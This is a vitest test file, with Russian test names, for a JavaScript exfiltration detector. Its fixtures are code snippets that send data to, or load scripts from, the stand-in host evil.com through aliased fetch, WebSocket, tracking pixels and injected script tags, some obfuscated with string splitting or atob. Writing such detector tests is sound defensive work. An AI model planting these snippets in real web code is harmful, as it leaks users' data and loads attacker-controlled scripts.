import { describe, it, expect } from 'vitest';
import { parseJs } from '../../ast/parse.js';
import { detectExfilCalls } from '../detect-exfil-calls.js';
import type { DetectorContext } from '../../ast/types.js';

const MAIN = 'mysite.com';
const ctx = (source: string): DetectorContext => ({ source, relPath: 't.js', mainHost: MAIN });
const exfil = (src: string, threat: string): boolean => {
  const ast = parseJs(src, 't.js')!;
  return detectExfilCalls(ast, ctx(src)).some((r) => r.threatType === threat);
};

describe('DET-2 остаток — алиас глобальной функции', () => {
  it('const f = fetch; f(external)', () => {
    expect(exfil(`const f = fetch; f('//evil.com/x')`, 'exfil-fetch')).toBe(true);
  });
  it('var send = window.fetch; send(external)', () => {
    expect(exfil(`var send = window.fetch; send('https://evil.com/y')`, 'exfil-fetch')).toBe(true);
  });
  it('алиас + DET-1 склейка: const f = fetch; f("htt"+"ps://evil")', () => {
    expect(exfil(`const f = fetch; f('htt' + 'ps://evil.com')`, 'exfil-fetch')).toBe(true);
  });
  it('var WS = WebSocket; new WS(external)', () => {
    expect(exfil(`var WS = WebSocket; new WS('wss://evil.com/s')`, 'exfil-websocket')).toBe(true);
  });
});

describe('DET-2 остаток — двухстрочный Image().src', () => {
  it('var img = new Image(); img.src = external', () => {
    expect(exfil(`var img = new Image(); img.src = '//evil.com/p.gif'`, 'exfil-pixel')).toBe(true);
  });
  it('var img = new Image(); img.src = atob(...) — обфусцированный', () => {
    expect(exfil(`var img = new Image(); img.src = atob('aHR0cHM6Ly9l')`, 'exfil-pixel')).toBe(true);
  });
});

describe('DET-2 остаток — document.createElement(script/img).src', () => {
  it('двухстрочный createElement("script") + .src = external', () => {
    expect(
      exfil(`var s = document.createElement('script'); s.src = 'https://evil.com/x.js'`, 'exfil-script-src'),
    ).toBe(true);
  });
  it('инлайн document.createElement("script").src = external', () => {
    expect(
      exfil(`document.createElement('script').src = 'https://evil.com/x.js'`, 'exfil-script-src'),
    ).toBe(true);
  });
  it('createElement("img") трактуется как пиксель', () => {
    expect(
      exfil(`var p = document.createElement('img'); p.src = '//evil.com/t.gif'`, 'exfil-pixel'),
    ).toBe(true);
  });
});

describe('DET-2 остаток — РОБАСТНОСТЬ (без ложных срабатываний)', () => {
  it('const f = myFn (не глобал) → вызов НЕ exfil', () => {
    expect(exfil(`const f = myFn; f('//evil.com')`, 'exfil-fetch')).toBe(false);
  });
  it('Image().src на локальный путь НЕ флагуется', () => {
    expect(exfil(`var img = new Image(); img.src = '/local/p.gif'`, 'exfil-pixel')).toBe(false);
  });
  it('не-src свойство (.alt) НЕ флагуется', () => {
    expect(exfil(`var img = new Image(); img.alt = 'x'`, 'exfil-pixel')).toBe(false);
  });
  it('createElement("div").src (неизвестный сток) НЕ флагуется', () => {
    expect(exfil(`var d = document.createElement('div'); d.src = '//evil.com'`, 'exfil-script-src')).toBe(false);
    expect(exfil(`var d = document.createElement('div'); d.src = '//evil.com'`, 'exfil-pixel')).toBe(false);
  });
  it('createElement("script") + локальный .src НЕ флагуется', () => {
    expect(
      exfil(`var s = document.createElement('script'); s.src = '/local/app.js'`, 'exfil-script-src'),
    ).toBe(false);
  });
});

describe('DET-2 остаток — НЕ-регресс: прямые формы', () => {
  it('инлайн new Image().src = external по-прежнему ловится', () => {
    expect(exfil(`new Image().src = '//evil.com/p'`, 'exfil-pixel')).toBe(true);
  });
  it('прямой fetch(external) по-прежнему ловится', () => {
    expect(exfil(`fetch('//evil.com')`, 'exfil-fetch')).toBe(true);
  });
});
